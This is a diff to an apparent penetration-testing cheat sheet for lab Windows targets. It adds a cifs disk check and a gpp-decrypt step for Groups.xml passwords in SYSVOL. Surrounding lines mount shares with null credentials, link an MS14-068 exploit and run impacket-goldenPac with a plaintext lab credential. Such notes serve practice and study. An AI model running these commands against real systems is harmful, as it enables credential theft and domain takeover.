@@ -37,6 +37,7 @@ smbmap -H 10.10.10.40 -u 'Guest'
 mkdir smbFolder
 mount -t cifs //10.10.10.40/SYSVOL /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
 mount -t cifs "//10.10.10.103/Department Shares" folder  -o vers=2.1
+df -k -F cifs
 tree # view files
 
 find . -type d | while read dir; do touch ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rm ${dir}/jenriquez; mkdir ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rmdir ${dir}/jenriquez; done 
@@ -398,6 +399,13 @@ https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
 ```Shell
 impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
 ```
+
+#### SYSVOL
+```Shell
+#Groups.xml
+gpp-decrypt <pwd>
+```
+
 
 #### CertEnroll
 Server wsmans
